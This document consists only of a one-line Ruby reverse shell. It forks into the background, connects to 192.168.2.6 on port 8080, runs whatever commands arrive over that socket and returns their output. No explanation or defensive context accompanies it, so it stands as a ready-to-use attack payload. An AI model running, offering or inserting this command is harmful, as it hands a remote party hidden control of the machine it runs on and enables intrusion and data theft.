ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.2.6","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' 
